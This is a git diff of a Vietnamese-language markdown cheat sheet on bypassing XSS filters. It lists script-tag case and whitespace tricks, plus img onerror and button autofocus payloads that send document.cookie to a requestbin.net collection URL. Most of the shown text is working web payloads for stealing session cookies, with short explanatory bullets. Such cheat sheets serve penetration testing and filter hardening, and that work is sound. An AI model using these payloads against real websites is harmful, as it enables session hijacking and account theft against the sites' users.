@@ -33,10 +33,12 @@ Tùy thuộc vào cơ chế filter mà có các cách bypass khác nhau. Nếu v
 ```<SCRIPT>alert(1);</SCRIPT>```
 ```<ScRipT>alert(1);</sCriPt>```
 ### Lọc thẻ script
-* Insert thêm ký tự (x09->Tab, x10->Escape)
+* Insert thêm ký tự trình duyệt hay bỏ qua (x09->Tab, x10->Escape)
+
 ```<script  >alert(1);</script   >```
 
 * Không dùng thẻ script
+
 ```<img src=x onerror=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)>```
 
 ```<button autofocus onfocus=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)></button>```
